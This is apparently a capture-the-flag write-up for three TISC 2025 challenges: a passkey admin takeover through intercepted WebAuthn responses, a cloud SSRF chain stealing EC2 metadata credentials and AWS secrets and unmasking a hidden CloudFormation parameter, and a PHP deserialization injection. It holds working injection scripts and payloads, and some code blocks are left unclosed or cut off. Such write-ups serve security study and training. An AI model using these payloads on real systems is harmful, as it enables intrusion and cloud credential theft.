## LEVEL 6 - Passkey

### Description

Our web crawler has flagged a suspicious unlisted web service that looks to be a portal where SPECTRE operates from. It does not seem to rely on traditional authentication methods, however.  
  
This service is open for anyone to sign up as a user. All you need is a unique username of your choosing, and passkey.  
  
Go to \[challenge instance\] to begin.  
  
Good luck, and may your passkeys guide you to victory!

### Solution

#### Analysis

Registered as a new user with a passkey associated with it.
![](../../../assets/tisc2025/c8380b996c0b8eddc20e11e283cc17c3.png)
![](../../../assets/tisc2025/2ecd2614f494d3d7a6528ba77f9b78a1.png)

There are two dashboards.
- `/member`
- `/admin`

![](../../../assets/tisc2025/7aca257d0ddbf96e2ff7e7d8e4172a51.png)

However, my account does not have admin privileges. Thus, I got routed into `/notadmin`.
![](../../../assets/tisc2025/e2be2aa69d9a9777fddb6018c011645b.png)

Here are the auth endpoints I've found:
- `/register`
- `/register/auth`
- `/login`
- `/login/auth`
- `/logout`


Full registration workflow.
1. GET 200 `/register`
   There is a `form` with a `username` field and submit it to do a POST request to the next endpoint.
   
2. POST 200 `/register/auth`
   The form submit does a POST request with a script running WebAuthn `createPasskey()`.
   The function fills up a credentials form and submits the `registration-form` to the next endpoint.
   
3. POST 302 `/register`
   Once the POST request is submitted, a redirect request is done to `/`.
   This request also consists of a persistent `passkey.tisc` cookie value.

Full login flow.
1. GET 200 `/login`
   There is a `form` with a `username` field and submit it to do a POST request to the next endpoint.
   
2. POST 200 `/login/auth`
   The form submit does a POST request with a script running WebAuthn `startWebAuthnAuth()`.
   The function fills up a credentials form and submits the `auth-form` to the next endpoint.
   
3. POST 302 `/login`
   Once the POST request is submitted, a redirect request is done to `/`.
   This request also consists of a persistent `passkey.tisc` cookie value.

#### Attempted

Attempted to intercept and modify the response of the `/register/auth` and changed the username in the script to `admin` to create an admin passkey.
![](../../../assets/tisc2025/7fbed208f113eef2c30e5c410ae19230.png)
![](../../../assets/tisc2025/dae8246455d92b052e0c09d6cbacdf17.png)
![](../../../assets/tisc2025/bb525ebb2f43d050cf608f59cfb2025f.png)

However, it did not redirect me to the dashboard. Attempting to make use of the created passkey did not work out.
![](../../../assets/tisc2025/bc21e834fdf294941ea285323882112d.png)

Obtaining the `credId_b64url` (from registration) and replacing the credential ID from the login auth page gave the response of `Invalid passkey credential`.
![](../../../assets/tisc2025/493dcae16722cadc8c58491667a24017.png)
![](../../../assets/tisc2025/4e1e448bdf259fee11b914b9339b87b0.png)

I also attempted to make use of [WebDevAuthn]([https://gramthanos.github.io/WebDevAuthn/](https://gramthanos.github.io/WebDevAuthn/)) extension to make things easier for myself. However, due to a race condition with Windows Hello Authenticator and how the credential payload is created, I could not make use of **WebDevAuthn**.

#### Successful Attempt

I basically did the same thing but instead of modifying the `const username` variable, I modified the passkey.

1. Registered a new account at `/register`. In this case I created an account `admin2`. (I didn't expect this account to not exist yet LOL)
   
   Before submitting the form, I turned on Intercept in Burpsuite. Ensure that **Settings > Proxy > Response interception rules** is turned on cause we are modifying that.
   
   ![](../../../assets/tisc2025/cb09071335530b5e24b9225397d0d172.png)
   ![](../../../assets/tisc2025/58195959e4ebe628d6351d77ae96f934.png)
   ![](../../../assets/tisc2025/76aa79ad7f643b5f2bded5f3e85f7122.png)

2. In the intercepted **RESPONSE** of `/register/auth`, modify the credential creation usernames and replace them with `admin`. Do not modify the actual `const username` variable.
   ![](../../../assets/tisc2025/dbd9509704bc41593acc80620f334b7f.png)
   ![](../../../assets/tisc2025/8c5c10f3fdd7997d6d86722900f806ec.png)

3. Within your HTTP History, find the `302 POST /register` and copy the attestation object.
   ![](../../../assets/tisc2025/21cda36c4e6a2451c9ade314050b96af.png)
   
4. Decode to Base64 then further decode the `authData` using `cbor2`. Afterwards, copy the value in `credId_b64url`.
```json
{
    "attStmt": {},
    "authData": "xwgw9416p0vIny4ypoanXkcXJdFxRlkGzC1FwfdONH9FAAAAAAAAAAAAAAAAAAAAAAAAAAAAICVzaHquRA5OI2UPjRZUfvBc3E5gWnW3Te3He1vj-BX8pQECAyYgASFYIOs7NkPDcBnWWvxJSBaU5amFFcrJUs4gQvyAKzTEdqHKIlggWCORsIolS46_fFRk5yTtkEvwaQamYu1Zr9sRf7yydqE",
    "fmt": "none"
}
```
```json
{
    "aaguid": "00000000000000000000000000000000",
    "cosePublicKey_hex": "a5010203262001215820eb...",
    "counter": 0,
    "credIdLen": 32,
    "credId_b64url": "JXNoeq5EDk4jZQ-NFlR-8FzcTmBadbdN7cd7W-P4Ffw",
    "flags": 69,
    "rpIdHash": "c70830f78d7aa74bc89..."
}
```

5. Log out and go to `/login` and enter the username `admin`.
   
   Before submitting the form, I turned on Intercept in Burpsuite once again.
   
   ![](../../../assets/tisc2025/cb09071335530b5e24b9225397d0d172.png)
   ![](../../../assets/tisc2025/31c9a4894f6edfcd2fd4db17dcb4d37d.png)

5. Modified the `allowCredentials` in the intercepted **RESPONSE** and pasted in the `credId_b64url` from Step 4.
   ![](../../../assets/tisc2025/781e8c0326ebbf21b0dbdfde8bd835a4.png)
   ![](../../../assets/tisc2025/5449cc73b331a7acee8f902a2ec1cba3.png)

6. Now I have access to the `/admin` endpoint, getting me the flag.

## LEVEL 7A - Santa ClAWS

### Description

We‚Äôve intercepted traffic between Spectre‚Äôs internal networks and a mysterious seasonal web service called Santa ClAWS Certificate Generator ‚Äî a portal used to issue ‚ÄúNaughty‚Äù or ‚ÄúNice‚Äù certificates for festive felines.  
  
This seemingly innocent site may be hiding something deeper ‚Äî a covert cloud operations backend.  
  
Scratch beneath the surface. Unravel the yarn of lies. Every cat may hold a clue.

### Solution
#### Preliminary Analysis

There is a form that I can fill to generate a certificate. It does a POST request to `/generate-flyer` and I receive a "CERTIFIED GOOD KITTY" PDF file.
![](../../../assets/tisc2025/5b01a242bfafa0e4214257696732c52e.png)
![](../../../assets/tisc2025/40fe2b57ddd64ab265c26fea07441b35.png)

Doing a GET request to the same endpoint `/generate-flyer` returns me back a lot of 'None' values.
![](../../../assets/tisc2025/cbb2bb09b32be1fe6f867dd8f7c4fba8.png)

I went ahead and tried using HTML elements and set the description to:
```html
<script>var x=new XMLHttpRequest();x.onreadystatechange=function(){if(x.readyState===4){document.body.innerHTML='<pre>'+x.responseText+'</pre>';}};x.open('GET','file:///etc/passwd',true);x.send();</script>
```

It seems that the HTML response got successfully parsed, which means that there is no sanitization.
![](../../../assets/tisc2025/77fe8cdfcd2319670a9b52665faa87c4.png)


The website is run on an AWS EC2 instance after doing an IP lookup. The challenge description hinted at Cloud being the focus point of the challenge, so I will start focusing my efforts into Cloud SSRF techniques.
![](../../../assets/tisc2025/4876334ce0ee2c65cc9e92fa362d782b.png)

The next section will be checking whether it is vulnerable to Cloud-based SSRF techniques.

#### SSRF Analysis

Here are some posts I read before attempting to perform SSRF:

```


I then tested a bunch of HTML script injections that allows me to:
1. copy and paste as text (i.e. responses which are in HTML are not interpreted as such)
2. **full** response text.

I ended up going with this script.
```html
<script>
    var x = new XMLHttpRequest();
    x.onreadystatechange = function() {
        if (x.readyState === 4) {
            document.open();
            document.write('<html><body style="font-size: 1px"><pre id="code"></pre></body></html>');
            document.close();
            document.getElementById("code").textContent = x.responseText;
        }
    };
    x.open('GET', '<web/file>', true);
    x.send();
</script>
```

Here are some test queries I did that aren't particularly useful for this CTF.
`file:///etc/os-release`
![](../../../assets/tisc2025/84ce47ca49bbfc6b2f6d0ccf3fa09ec6.png)

`file:///etc/hostname`
![](../../../assets/tisc2025/1389717337afbe959ca1bcc470efe51c.png)

`file:///var/lib/cloud/data/instance-id`
![](../../../assets/tisc2025/664772c720e43b3fcda8181de2306c0d.png)

#### Website and Proxy Analysis (through SSRF)

Here are some files that helped in the CTF process.
`file:///var/log/cloud-init.log`
![](../../../assets/tisc2025/7118300d803dd8f50d1f1489e4628d31.png)
*A 17-page PDF showing DEBUG logs*

Found app location in the `file:///var/log/syslog`
![](../../../assets/tisc2025/5e9c8cdf49408ff8c81d38f52a528f76.png)

And from there also found the exact version of the `wkhtmltopdf` used.
```
wkhtmltopdf amd64 0.12.6-2build2
```

Thus, managing to get the `/home/ubuntu/app/app.py`
![](../../../assets/tisc2025/4a2e0858771d49e7b77e0619679ba925.png)

The **CORS** code is a hint implying that I am supposed to make some IMDSv2 request to extract metadata.

```python
CORS(app, resources={r"/*": {"origins": "*"}},
    allow_headers=["X-aws-ec2-metadata-token-ttl-seconds"],
    methods=["GET","POST","PUT","OPTIONS"])
```

However, attempting to make use of the magic IP with `http://169.254.169.254/latest/api/token` gave me a status `0`, implying that my request was blocked at the network-level.

After further digging, I found that I could read the file `/var/log/auth.log`. Within there I found some services that are being executed.
```
2025-09-23T17:09:28.130733+00:00 ip-172-31-43-25 sudo: root : PWD=/home/ubuntu/app ; USER=root ; COMMAND=/usr/bin/ln -s /etc/nginx/sites-available/imds_proxy /etc/nginx/sites-enabled/
```

I found that the NGINX proxy had defined an IMDSv2 proxy at `/etc/nginx/sites-available/imds_proxy`.
```nginx
server {
    listen 45198;
    access_log /var/log/nginx/imds_access.log combined;
    add_header 'Access-Control-Allow-Origin' '*' always;
    add_header 'Access-Control-Allow-Methods' 'GET, OPTIONS, PUT' always;
    add_header 'Access-Control-Allow-Headers' 'X-Requested-With, Content-Type, X-aws-ec2-metadata-token, X-aws-ec2-metadata-token-ttl-seconds' always;
    location / {
        proxy_pass http://169.254.169.254/;
        proxy_http_version 1.1;
        proxy_set_header Host 169.254.169.254;
        proxy_set_header Connection "";
        proxy_set_header X-aws-ec2-metadata-token $http_x_aws_ec2_metadata_token;
        proxy_connect_timeout 60s;
        proxy_read_timeout 120s;
        proxy_send_timeout 120s;
        if ($request_method = OPTIONS) {
            add_header 'Access-Control-Allow-Origin' '*' always;
            add_header 'Access-Control-Allow-Methods' 'GET, OPTIONS, PUT' always;
            add_header 'Access-Control-Allow-Headers' 'X-Requested-With, Content-Type, X-aws-ec2-metadata-token, X-aws-ec2-metadata-token-ttl-seconds' always;
            return 204;
        }
    }
}
```

Using the internal proxy, I managed to get the token.
```html
<script>
    let xhr = new XMLHttpRequest();

    xhr.onreadystatechange = function() {
        if (xhr.readyState === 4) {
            document.open();
            document.write('<html><body><pre>' + xhr.responseText + '</pre></body></html>');
            document.close();
        }
    };

    xhr.open("PUT", "http://127.0.0.1:45198/latest/api/token", true);
    xhr.setRequestHeader("X-aws-ec2-metadata-token-ttl-seconds", "21600");
    xhr.send();
</script>
```

Now that I have this, I get make a GET request for the credentials to make use of AWS CLI with.
```html
<script>
    const token = "AQAEANXL_v1H-g6xqHtJMk242Ck11hRJ9JL2d9EJHWR3XjPDlrWN3Q==";

    let xhr = new XMLHttpRequest();

    xhr.onreadystatechange = function() {
        if (xhr.readyState === 4) {
            document.open();
            document.write('<html><body><pre>' + xhr.responseText + '</pre></body></html>');
            document.close();
        }
    };

    xhr.open("GET", "http://127.0.0.1:45198/latest/meta-data/iam/security-credentials/", true);
    xhr.setRequestHeader("X-aws-ec2-metadata-token",token);
    xhr.send();
</script>
```

The script above returns the role, in this case it is `claws-ec2`. With this, we can query for the credentials.
```html
<script>
    const token = "AQAEANXL_v1H-g6xqHtJMk242Ck11hRJ9JL2d9EJHWR3XjPDlrWN3Q==";
    const role = "claws-ec2"

    let xhr = new XMLHttpRequest();

    xhr.onreadystatechange = function() {
        if (xhr.readyState === 4) {
            document.open();
            document.write('<html><body><pre>' + xhr.responseText + '</pre></body></html>');
            document.close();
        }
    };

    xhr.open("GET", "http://127.0.0.1:45198/latest/meta-data/iam/security-credentials/" + encodeURIComponent(role), true);
    xhr.setRequestHeader("X-aws-ec2-metadata-token",token);
    xhr.send();
</script>
```

Here is an example of the output:
```json
{
  "Code": "Success",
  "LastUpdated": "2025-09-24T08:13:29Z",
  "Type": "AWS-HMAC",
  "AccessKeyId": "ASIAXYKJ...",
  "SecretAccessKey": "z6h0kmPqYkGhLwCv9...",
  "Token": "IQoJb3JpZ2luX2VjE...",
  "Expiration": "2025-09-24T14:25:17Z"
}
```

#### claws-ec2: AWS CLI

I exported the credentials to my current shell environment.
```shell
export AWS_ACCESS_KEY_ID=...
export AWS_SECRET_ACCESS_KEY=...
export AWS_SESSION_TOKEN=...
```

Called for the identity to make sure that I have typed in the credentials correctly.
```shell
$ aws sts get-caller-identity
{
    "UserId": "AROAXYKJQ7ESLMFI4GBVL:i-0dd33406f2f2b2acd",
    "Account": "533267020068",
    "Arn": "arn:aws:sts::533267020068:assumed-role/claws-ec2/i-0dd33406f2f2b2acd"
}
```

I tried listing the contents of the secretsmanager and found some `internal_web_api_key`.
```shell
$ aws secretsmanager list-secrets --region ap-southeast-1 --max-results 20
{
    "SecretList": [
        {
            "ARN": "arn:aws:secretsmanager:ap-southeast-1:533267020068:secret:internal_web_api_key-mj8au2-U5o6lT",
            "Name": "internal_web_api_key-mj8au2",
            "Description": "To access internal web apis",
            "LastChangedDate": "2025-09-24T01:06:33.419000+08:00",
            "LastAccessedDate": "2025-09-24T08:00:00+08:00",
            "SecretVersionsToStages": {
                "terraform-20250923170633383800000003": [
                    "AWSCURRENT"
                ]
            },
            "CreatedDate": "2025-09-24T01:06:31.528000+08:00"
        }
    ]
}
```

The `api_key` is `Uqv2JgVFhKtTsNUTyeqDkmwcjgWrar8s`, but so far there is no internal web service that is making use of this API key. 
```shell
$ aws secretsmanager get-secret-value --secret-id internal_web_api_key-mj8au2 --region ap-southeast-1
{
    "ARN": "arn:aws:secretsmanager:ap-southeast-1:533267020068:secret:internal_web_api_key-mj8au2-U5o6lT",
    "Name": "internal_web_api_key-mj8au2",
    "VersionId": "terraform-20250923170633383800000003",
    "SecretString": "{\"api_key\":\"Uqv2JgVFhKtTsNUTyeqDkmwcjgWrar8s\"}",
    "VersionStages": [
        "AWSCURRENT"
    ],
    "CreatedDate": "2025-09-24T01:06:33.415000+08:00"
}
```

Next, I queried the S3 buckets to see what I can find.

Within the `user-data` (from the metadata SSRF) reveals some endpoint to an S3 bucket.
```shell
#!/bin/bash

# Install packages
sudo apt update -y
sudo apt install -y wkhtmltopdf nginx unzip python3-pip python3.12-venv 

url "https://awscli.amazonaws.com/awscli-exe-linux-x86_64.zip" -o "awscliv2.zip" 
unzip awscliv2.zip
sudo ./aws/install # Define variables APP_DIR="/home/ubuntu/app" 

ZIP_FILE="app.zip"
S3_BUCKET="s3://claws-web-setup-bucket" 
VENV_DIR="$APP_DIR/venv"

# Fetch ZIP from S3
aws s3 cp "$S3_BUCKET/$ZIP_FILE"

I managed to find the first piece of the flag `flag1.txt` in the S3 bucket `claws-web-setup-bucket`. I downloaded `flag1.txt` and it only showed the first part of the flag.
```shell
$ aws s3api list-objects-v2 --bucket claws-web-setup-bucket --max-items 100 --region ap-southeast-1 2>&1 | sed -n '1,200p'

            "ChecksumAlgorithm": [

            "StorageClass": "STANDARD"
        }
    ],
    "RequestCharged": null,
    "Prefix": ""
}
```

I went to check whether there were any other EC2 instances that are running and found `claws-internal`, which should be the so called 'backend' server that the challenge description was mentioning about.
```shell
$ aws ec2 describe-instances --filters "Name=tag:Name,Values=*claws*" --region ap-southeast-1 --output json > ec2_desc.json
```
```json
{
    "Reservations": [
        {
            ...
            "Instances": [
                {
                    ...
                    "Tags": [
                        {
                            "Key": "Name",
                            "Value": "claws-internal"
                        }
                    ]
                    ...
                    "PrivateIpAddress": "172.31.73.190"
                }
            ]
        },
        {
            ...  // claws-web (current)
        }
    ]
}

```

#### SSRF: claws-internal

Using the same SSRF script as the one in the previous SSRF analysis, I managed to find the website located at `http://172.31.73.190`. It had a `main.js` defined within the HTML.

```html
<script src="/main.js"></script>
```

The JS shows two endpoints I can make use of.
```js
const statusEl = document.getElementById("stack_status");
const healthStatusEl = document.getElementById("health_status");
const urlInput = document.getElementById("url_input");

function get_stack() {
  fetch(`/api/generate-stack?api_key=${apiKey}`)
    .then((res) => res.json())
    .then((data) => {
      if (data.stackId) {
        statusEl.textContent = `Stack created: ${data.stackId}`;
      } else {
        statusEl.textContent = `Error: ${data.error || "Unknown"}`;
        console.error(data);
      }
    })
    .catch((err) => {
      statusEl.textContent = "Request failed";
      console.error(err);
    });
}

function check_url() {
  const url = urlInput.value;
  if (!url) {
    healthStatusEl.textContent = "Please enter a URL";
    return;
  }
  fetch(`/api/healthcheck?url=${encodeURIComponent(url)}`)
    .then((res) => res.json())
    .then((data) => {
      if (data.status === "up") {
        healthStatusEl.textContent = "Site is up";
      } else {
        healthStatusEl.textContent = `Site is down: ${data.error}`;
      }
    })
    .catch((err) => {
      healthStatusEl.textContent = "Healthcheck failed";
      console.error(err);
    });
}
```

I was certain that the `/api/healthcheck?url=` endpoint had to be SSRF vulnerable.
The `/api/generate-stack?api_key=` endpoint reminded me of the API key within the secrets manager.

I first tested the generate stack endpoint with the internal API key. I got this output:
```json
{
  "stackId": "arn:aws:cloudformation:ap-southeast-1:533267020068:stack/pawxy-sandbox-83dbf0fb/a7ea5220-996a-11f0-bec6-029394e9e639"
}
```

It showed some AWS CloudFormation thing. I found out that this was the output for when some CloudFormation is being created.

I continued and tested with IMDSv1 (since there was no feasible way to do PUT requests) and got around to getting the credentials.
```json
<script>
  const url = "http://172.31.73.190/api/healthcheck?url=" +
              encodeURIComponent("http://169.254.169.254/latest/meta-data/iam/security-credentials/");
  const x = new XMLHttpRequest();
  x.onreadystatechange = function(){
    if(x.readyState === 4){
      document.open();
      document.write('<html><body><font size="2"><pre>' + (x.responseText||'') + '</pre></font></body></html>');
      document.close();
    }
  };
  x.open("GET", url, true);
  x.send();
</script>
```
```json
<script>
  const role = "internal-ec2";
  const url = "http://172.31.73.190/api/healthcheck?url=" +
              encodeURIComponent("http://169.254.169.254/latest/meta-data/iam/security-credentials/" + role);
  const x = new XMLHttpRequest();
  x.onreadystatechange = function(){
    if(x.readyState === 4){
      document.open();
        document.write('<html><body style="font-size: 1px"><pre id="code"></pre></body></html>');
        document.close();
        document.getElementById("code").textContent = x.responseText;
    }
  };
  x.open("GET", url, true);
  x.send();
</script>
```

#### claws-internal: AWS CLI

I checked the stack and found that there is a parameter with `flagpt2`. However, it is hidden.
```shell
$ aws cloudformation describe-stacks --stack-name pawxy-sandbox-83dbf0fb
{
    "Stacks": [
        {
            "StackId": "arn:aws:cloudformation:ap-southeast-1:533267020068:stack/pawxy-sandbox-83dbf0fb/a7ea5220-996a-11f0-bec6-029394e9e639",
            "StackName": "pawxy-sandbox-83dbf0fb",
            "Description": "Flag part 2\n",
            "Parameters": [
                {
                    "ParameterKey": "flagpt2",
                    "ParameterValue": "****"
                }
            ],
            "CreationTime": "2025-09-24T17:19:41.217000+00:00",
            "RollbackConfiguration": {},
            "StackStatus": "CREATE_FAILED",
            "StackStatusReason": "The following resource(s) failed to create: [AppDataStore]. ",
            "DisableRollback": true,
            "NotificationARNs": [],
            "Capabilities": [
                "CAPABILITY_IAM"
            ],
            "Tags": [],
            "EnableTerminationProtection": false,
            "DriftInformation": {
                "StackDriftStatus": "NOT_CHECKED"
            }
        }
    ]
}
```

Looking at the template, it seems that the `flagpt2` has `NoEcho` set to true, hiding the flag.
```shell
$ aws cloudformation get-template --stack-name pawxy-sandbox-83dbf0fb --query TemplateBody --output text
AWSTemplateFormatVersion: '2010-09-09'
Description: >
  Flag part 2

Parameters:
  flagpt2:
    Type: String
    NoEcho: true

Resources:
  AppDataStore:
    Type: AWS::S3::Bucket
    Properties:
      BucketName: !Sub app-data-sandbox-bucket
```

I found a blog post online showing how to remove the `NoEcho` to reveal the flag.
```cardlink

```

Following the instructions, I managed to un-`NoEcho` the parameter to reveal the contents of the final piece of the flag.

Start by updating the stack (and with `--disable-rollback` cause it doesn't work with `CREATE_FAILED` stacks).

```yaml
AWSTemplateFormatVersion: '2010-09-09'
Description: >
  Flag part 2

Parameters:
  flagpt2:
    Type: String
    #NoEcho: true

Resources:
  AppDataStore:
    Type: AWS::S3::Bucket
    Properties:
      BucketName: !Sub app-data-sandbox-bucket
```

```shell
aws cloudformation update-stack \
  --stack-name pawxy-sandbox-83dbf0fb \
  --template-body file://reveal-flagpt2-template.yaml \
  --parameters ParameterKey=flagpt2,UsePreviousValue=true \
  --capabilities CAPABILITY_IAM \
  --disable-rollback \
  --region ap-southeast-1
```

Now to obtain the flag.
```shell
aws cloudformation describe-stacks \
  --stack-name pawxy-sandbox-83dbf0fb \
  --region ap-southeast-1 \
  --query 'Stacks[0].[StackStatus,StackStatusReason,Parameters]' \
  --output json
```
```json
[
    "UPDATE_FAILED",
    "The following resource(s) failed to create: [AppDataStore]. ",
    [
        {
            "ParameterKey": "flagpt2",
            "ParameterValue": "_c47_4S7r0PHiC_fL4w5}"
        }
    ]
]
```

Thus, completing the challenge (finally).

### Flag

```
TISC{iMPURrf3C7_sSRFic473_Si73_4nd_c47_4S7r0PHiC_fL4w5}

## LEVEL 8A - VirusVault

### Description

Welcome to the VirusVault, the most secure way to store dangerous viruses.  
Surely nothing can go wrong storing them this way!

### Solution

#### Preliminary
#### App Structure

The challenge provided `virus_vault.zip`, containing the entire application and it contained these files:
```tree
src/
‚îú‚îÄ app/
‚îÇ  ‚îú‚îÄ DarkFurnace.txt
‚îÇ  ‚îú‚îÄ Ghostroot.txt
‚îÇ  ‚îú‚îÄ index.html
‚îÇ  ‚îú‚îÄ index.php
‚îÇ  ‚îú‚îÄ IronHydra.txt
‚îÇ  ‚îú‚îÄ source.php
‚îÇ  ‚îî‚îÄ Voltspike.txt
‚îú‚îÄ Dockerfile
‚îú‚îÄ nginx.conf
‚îî‚îÄ start.sh
```

I first had to deal with the Docker registry confirmed to be partially degraded and it sustained this status for the next 4 hours.
![](../../../assets/tisc2025/d990d51573928757402466fbf77bcff4.png)

After the Docker registry changed to **Operational**, I went and used the build command and got this error:
```shell
 => ERROR [3/9] RUN apt install -y php8.2-fpm php-mbstring php-sqlite3 sqlite3 nginx && apt clean                                                                    1.0s
------
 > [3/9] RUN apt install -y php8.2-fpm php-mbstring php-sqlite3 sqlite3 nginx && apt clean:
0.974 Error: Unable to locate package php8.2-fpm
0.974 Error: Couldn't find any package by glob 'php8.2-fpm'
```

I found a quick fix by looking at the `start.sh` file and finding the actual version to be `8.4`.
```bash
#!/bin/bash

nginx -g 'daemon off;' &
/usr/sbin/php-fpm8.4 &

wait
```
```diff
-RUN apt install -y php8.2-fpm php-mbstring php-sqlite3 sqlite3 nginx && apt clean
+RUN apt install -y php8.4-fpm php-mbstring php-sqlite3 sqlite3 nginx && apt clean
```

I quickly run to another issue where another line was referencing to `php8.2` again, which was quickly rectified.
```bash
 => ERROR [5/9] RUN sed -i 's/;clear_env/clear_env/' /etc/php/8.2/fpm/pool.d/www.conf                                                                                0.3s
------
 > [5/9] RUN sed -i 's/;clear_env/clear_env/' /etc/php/8.2/fpm/pool.d/www.conf:

```
```diff
-RUN sed -i 's/;clear_env/clear_env/' /etc/php/8.2/fpm/pool.d/www.conf
+RUN sed -i 's/;clear_env/clear_env/' /etc/php/8.4/fpm/pool.d/www.conf
```

The `Dockerfile` contained an `ENV` directive that contains the sample flag of the challenge, which the end goal is probably fetching the environment values somehow. 
```Dockerfile
# Start the container by running the startup script
ENV FLAG="TISC{this_is_a_sample_flag}"
CMD ["sh", "/start.sh"]
```

Looking at the `nginx.conf`, it defines the rules:
- Serve files in the following order: `$uri $uri/ =404;`
- Only allow files with the `.php` extension
- Makes use of `php8.4-fpm.sock` for processing `.php` files

#### Web Code Analysis

Within the `index.php` included serialization and conversion logic.
```php
public function storeVirus(Virus $virus)
{
    $ser = serialize($virus);
    $quoted = $this->pdo->quote($ser);
    $encoded = mb_convert_encoding($quoted, 'UTF-8', 'ISO-8859-1');

    try {
        $this->pdo->query("INSERT INTO virus_vault (virus) VALUES ($encoded)");
        return $this->pdo->lastInsertId();
    } catch (Exception $e) {
        throw new Exception("An error occured while locking away the dangerous virus!");
    }
}
```

The full flow of the `storeVirus()` function:
1. Serialize the `$virus` object
2. Escape quotes (in this case it is change single quotes from `'` to `''`)
3. Converts the string to `UTF-8` as represented in `ISO-8859-1` (converting to `ISO-8859-1` and mapping it back to `UTF-8` characters)
4. Runs an `INSERT` query to insert the serialized payload into the `virus_vault`
5. Gets the `lastInsertId()` and returns it

The serialized payload looks like this:
```json
O:5:"Virus":3:{s:4:"name";s:6:"Normal";s:7:"species";s:9:"Ghostroot";s:13:"valid_species";a:4:{i:0;s:9:"Ghostroot";i:1;s:9:"IronHydra";i:2;s:11:"DarkFurnace";i:3;s:9:"Voltspike";}}
```

According to the `mb_convert_encoding()` documentation, the syntax is:
```php
mb_convert_encoding(array|string $string, string $to_encoding, array|string|null $from_encoding = null): array|string|false
```

So after serialization, it converts the serialized payload from `ISO-8859-1` to `UTF-8`.
In `ISO-8859-1`, there is a character `√ø` which is `0xFF` in Latin-1 becomes `√É¬ø`. This expands the character count from 1 to 2.

The value after the `s:` tells the serializer how long the value is. Let's take the following serialized payload below as an example.
```json
O:5:"Virus":3:{s:4:"name";s:35:"x";s:7:"species";s:13:"/tmp/flag.md";s:7:"species";s:9:"Ghostroot";s:13:"valid_species";a:4:{i:0;s:9:"Ghostroot";i:1;s:9:"IronHydra";i:2;s:11:"DarkFurnace";i:3;s:9:"Voltspike";}}
```

You would expect `s:4:"name";s:35:"x";` to covert to `$name = "x"`. However, the length is defined as **35**. Thus, instead of that, it will set the `$name` value to:
```
%27";s:7:"species";s:13:"/tmp/flag.md
```

However, even if we did make use of the multi-byte exploit, there is still the issue of double definitions of fields. From the same serialized payload above, you can see that `species` is defined **twice**.

We can make use of `\x00` (`%00`) null bytes. The string after the null bytes will get removed. Why does this happen? This is because the PBO escaping quotes step as a by-product of escaping single-quotes also removed and parsed the null byte (I am not sure how this works but this is what I observed during testing.
```php
$quoted = $this->pdo->quote($ser);
```

So for the payload `hi%00`, we will end up with the string.
```json
O:5:"Virus":3:{s:4:"name";s:3:"hi
```
*note: I removed single-quotes for visual purposes*

```php
class Virus
{
    public $name;
    public $species;
    public $valid_species = ["Ghostroot", "IronHydra", "DarkFurnace", "Voltspike"];

    public function __construct(string $name, string $species)
    {
        $this->name = $name;
        $this->species = in_array($species, $this->valid_species) ? $species : throw new Exception("That virus is too dangerous to store here: " . htmlspecialchars($species));
    }

    public function printInfo()
    {
        echo "Name: " . htmlspecialchars($this->name) . "<br>";
        include $this->species . ".txt";
    }
}
```

We can combine both the multi-byte encoding (`%ff`) and the null bytes (`%00`) to create and control the other fields.

In this case we want to control `$species` since the `printInfo()` allows us to perform LFI (Local File Inclusion) exploits (or at least that was what I thought, see [Reading from ENV (Environment Variables)](#reading-from-env-environment-variables).

#### Exploiting Serialization with Multi/Null Bytes

To create the payload, we must understand how the multi-byte values work.

When trying directly with the multi-byte value, it serializes and counts as **2 characters**.
```json
s:2:"√ø" --encoding--> s:2:"√É¬ø"
```

Using the multi-byte character (`%ff`) counts as **1 character**.
```json
s:1:"ÔøΩ" --encoding--> s:1:"√ø"
```

From here we can make an equation to determine the number of multi-byte characters we require to make the `s:X` interpret the whole multi-byte values as part of the `name` field.

Let `X` be the serialized length of the payload (before encoding).
Let `L` be the total length of the payload
Let `H` be the number of multi-byte values.

```
X = L + H
```

The condition I need to fulfill is `X == 2H`, which simply means that `H = L`.

For example, given the payload:
```json
";s:7:"species";s:4:"flag";s:13:"valid_species";a:0:{}}%00
```
*56 characters after converting from URL-encoded to UTF-8.*

Since there are 56 characters, I will need 56 multi-byte characters in front as the prefix.
```json
%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff";s:7:"species";s:4:"flag";s:13:"valid_species";a:0:{}}%00
```
*112 characters after converting from URL-encoded to UTF-8.*

This will result in the following final encoded string:
```json
O:5:"Virus":3:{s:4:"name";s:112:"√ø√ø√ø√ø√ø√ø√ø√ø√ø√ø√ø√ø√ø√ø√ø√ø√ø√ø√ø√ø√ø√ø√ø√ø√ø√ø√ø√ø√ø√ø√ø√ø√ø√ø√ø√ø√ø√ø√ø√ø√ø√ø√ø√ø√ø√ø√ø√ø√ø√ø√ø√ø√ø√ø√ø√ø";s:7:"species";s:4:"flag";s:13:"valid_species";a:0:{}}
```

Each `√ø` character counts as 2 characters. Since there are 56 of them, it evaluates to 112 characters. Thus, the `name` field will only take the entire `√ø` string payload in and everything else after is part of the actual serialized object.

#### Reading from ENV (Environment Variables)

This is the part that took me two days to figure out.

The `printInfo()` function seems to be the entry point to make use of to get the flag.
```php
public function printInfo()
{
    echo "Name: " . htmlspecialchars($this->name) . "<br>";
    include $this->species . ".txt";
}
```

However, now I am presented with the issue:
```php
ini_set("open_basedir", getcwd());
```

This sets the current working directory (`/app`) as the base directory, preventing any file traversal outside of `/app`.

There is also:
```shell
root@3f2e9c76110c:/app# php -i | grep allow_url_include
allow_url_include => Off => Off
```

This prevents me from running any commands or performing any Remote File Inclusion (RFI) exploits. I tried to run `php://` payloads as well but none of them worked.

I also ended up trying to serialize other objects into the other fields but it was no use since there were no internal classes or libraries I can exploit magic methods with.

This stumped me for quite a long time... that was until 7 hours before **TISC** ended, after just searching to learn more about PHP wrappers:
```cardlink

```

The repository being 3 years old did not give me any hope but I eventually went and tried it anyways to see if it worked. I generated the chain and ended up with a long string of text.
```python

## My Final Thoughts

Back when I was interning in CSIT, one of the main objectives that I made for myself was to get a CSIT shirt. However, I received devastating insight that only full-timers got the shirts making it impossible for me to obtain one for myself. Then one day, an intern came in with a TISC shirt which sparked an idea in me: "Why not I get this year's TISC shirt?". That was what I did, I was committed to getting the TISC SWAG before my compulsory National Service starts, making it impossible for me to partake in future TISC's.

